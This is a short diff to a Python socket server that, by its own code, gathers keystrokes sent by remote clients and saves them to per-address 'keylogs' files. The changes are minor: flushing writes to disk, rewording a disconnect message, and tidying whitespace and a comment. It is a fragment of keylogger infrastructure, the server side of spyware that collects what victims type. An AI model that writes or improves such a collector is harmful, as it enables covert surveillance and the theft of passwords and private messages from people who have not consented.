@@ -16,6 +16,7 @@ def print_waitmsg(wait_msg, stop_event: Event):
             print(msg, end='\r', flush=True)
             time.sleep(0.3)
 
+
 def handle_client(conn: socket, addr, stop_event: Event):
     print("Got connection from ", addr)
     file = open(f"keylogs_{addr}.txt", "w")
@@ -30,14 +31,14 @@ def handle_client(conn: socket, addr, stop_event: Event):
                 break
             print(key, end="", flush=True)
             file.write(key)
+            file.flush()
         except socket.timeout:
             continue
         except :
             print("")
-            print("Exception. Error with client communication...")
+            print("Client must have disconnected.")
             file.close()
             break
-
 
 
 def start_server(stop_event: Event):
@@ -47,7 +48,6 @@ def start_server(stop_event: Event):
     print("Socket binded to 8080")
     print("")
     s.listen(5)
-    # print_waitmsg("Socket is listening")
     waitmsg_thread = threading.Thread(target=print_waitmsg, args=("Socket is listening", stop_event))
     waitmsg_thread.start()
     while s and not stop_event.is_set():
